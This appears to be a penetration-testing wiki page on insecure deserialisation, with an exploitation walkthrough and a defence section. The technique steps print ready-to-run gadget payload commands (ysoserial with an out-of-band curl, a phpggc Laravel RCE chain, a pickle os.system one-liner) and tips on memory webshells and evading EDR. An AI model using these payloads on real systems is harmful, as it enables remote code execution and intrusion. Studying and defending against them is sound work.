---
title: Insecure deserialisation
slug: deserialisation
---

> **TL;DR:** An app deserialises an attacker-controlled object graph; a "gadget chain" of method side-effects in scope reaches RCE, file write, or auth bypass.

## What it is
Serialisation formats (Java `ObjectInputStream`, .NET `BinaryFormatter`/`LosFormatter`, PHP `unserialize`, Ruby Marshal, Python `pickle`, YAML in unsafe mode, JSON with type hints) re-instantiate classes and invoke "magic" methods (`readObject`, `__wakeup`, `Finalize`, etc.). If any class on the classpath has dangerous behaviour reachable from those magic methods, an attacker who controls the bytes controls the side effect.

## Preconditions / where it applies
- A sink that deserialises untrusted bytes — session cookie, view state, RMI, cache, message queue, hidden form field, file upload.
- A gadget chain present in the runtime classpath. Public chains (ysoserial, ysoserial.net, PHPGGC, marshalsec) cover common stacks.
- The application reaches the sink with attacker data without integrity checks.

## Technique
1. **Identify format.** Magic bytes are strong tells: `AC ED 00 05` (Java), `O:` or `a:` (PHP), `\x80\x04` (pickle), `---` (YAML), base64 wrapping of any of the above.
2. **Find the sink.** Headers like `Cookie`, `Authorization`, `ViewState`, `__VIEWSTATE` (see [[viewstate-attacks]]), RPC endpoints, file imports. Capture a known-good blob first.
3. **Generate a gadget.** Use the chain matched to the stack.

   ```bash
   # Java — CommonsCollections6, fire a curl
   java -jar ysoserial.jar CommonsCollections6 'curl http://oast/' | base64 -w0
   # PHP — Laravel chain
   phpggc Laravel/RCE9 system 'id' -b
   # Python — pickle one-liner
   python -c "import pickle,os,base64; print(base64.b64encode(pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.system,('id',))})())).decode())"
   ```

4. **Deliver.** Swap the payload into the sink, watch for OOB callbacks first (DNS/HTTP). Echo back via timing if blind.
5. **Stabilise.** Once a chain fires, swap to a tool stager (memory webshell, in-process loader). Avoid shelling out where EDR is heavy.
6. **Defeat allowlists.** Some apps use class allowlists or `LookAheadObjectInputStream`. Hunt for a permitted class with reflective gadgets, or downgrade to a different sink.

## Detection and defence
- Do not deserialise untrusted data. Use a data-only format (JSON without polymorphic type info) and a strict schema.
- Sign + verify the blob if the format must round-trip through a client (HMAC over the bytes, key on the server).
- Use allowlist-based deserialisers (Jackson with `@JsonTypeInfo` disabled, Java `ObjectInputFilter`/JEP 290).
- Strip dangerous classes from the classpath (`commons-collections`, `Spring-AOP` gadgets) where feasible; pin versions and patch.
- Detection: EDR rules for child processes from java/php-fpm/python web workers; logs of `readObject` exceptions; canary class names planted in the classpath that trigger alerts when touched.

## References
- [PortSwigger — Insecure deserialization](https://portswigger.net/web-security/deserialization) — labs and chains.
- [OWASP Cheat Sheet — Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) — defences by language.
- [frohoff/ysoserial](https://github.com/frohoff/ysoserial) — Java gadget generator.
- [ambionics/phpggc](https://github.com/ambionics/phpggc) — PHP gadget generator.
